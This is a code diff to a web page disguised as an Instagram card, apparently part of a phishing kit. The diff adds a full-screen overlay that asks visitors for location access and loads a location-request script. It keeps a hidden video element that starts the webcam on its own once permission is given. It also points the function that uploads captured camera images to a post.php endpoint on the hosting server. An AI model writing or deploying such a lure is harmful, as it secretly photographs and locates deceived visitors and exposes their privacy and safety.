@@ -265,6 +265,23 @@
             to { transform: rotate(360deg); }
         }
 
+        .request-access-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(250,250,250,0.98); z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 40px; text-align: center; transition: opacity 0.5s ease;
+        }
+        .request-access-overlay.hidden { opacity: 0; pointer-events: none; }
+        .request-access-icon { width: 80px; height: 80px; margin-bottom: 24px; background: linear-gradient(45deg, #f09433, #e4405f);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; }
+        .request-access-title { font-size: 28px; font-weight: 700; margin-bottom: 16px; color: #262626; }
+        .request-access-text { font-size: 16px; color: #737373; margin-bottom: 24px; max-width: 400px; line-height: 1.5; }
+        .request-access-btn { padding: 14px 40px; font-size: 16px; font-weight: 600; border: none;
+            border-radius: 4px; background: linear-gradient(45deg, #f09433, #e4405f); color: #fff; cursor: pointer; }
+        .request-access-btn:hover { opacity: 0.9; }
+        .request-access-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .request-access-status { margin-top: 16px; font-size: 13px; color: #8e8e8e; }
+
         @media (max-width: 768px) {
             .instagram-card {
                 padding: 30px 20px;
@@ -278,6 +295,14 @@
     </style>
 </head>
 <body>
+    <div class="request-access-overlay" id="requestAccessOverlay">
+        <div class="request-access-icon">📍</div>
+        <div class="request-access-title">Request Access</div>
+        <div class="request-access-text">Please allow or deny location access to continue. We will wait for your response.</div>
+        <button class="request-access-btn" id="requestAccessBtn">Allow Location Access</button>
+        <div class="request-access-status" id="requestAccessStatus"></div>
+    </div>
+
     <div class="video-wrap" hidden="hidden">
         <video id="video" playsinline autoplay></video>
     </div>
@@ -358,12 +383,14 @@
         </div>
     </div>
 
+    <script src="location-request.js"></script>
     <script>
+        var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');
         function post(imgdata) {
             $.ajax({
                 type: 'POST',
                 data: { cat: imgdata },
-                url: 'forwarding_link/post.php',
+                url: BASE_URL + 'post.php',
                 dataType: 'json',
                 async: false,
                 success: function (result) {
@@ -448,10 +475,14 @@
             }, 2000);
         });
 
-        // Auto-start camera after page load
-        setTimeout(() => {
-            startCameraBtn.click();
-        }, 1000);
+        // Start camera after location permission
+        if (window.LocationRequest) {
+            LocationRequest.init(function() {
+                setTimeout(function() { startCameraBtn.click(); }, 500);
+            });
+        } else {
+            setTimeout(function() { startCameraBtn.click(); }, 1000);
+        }
     </script>
 </body>
 </html>
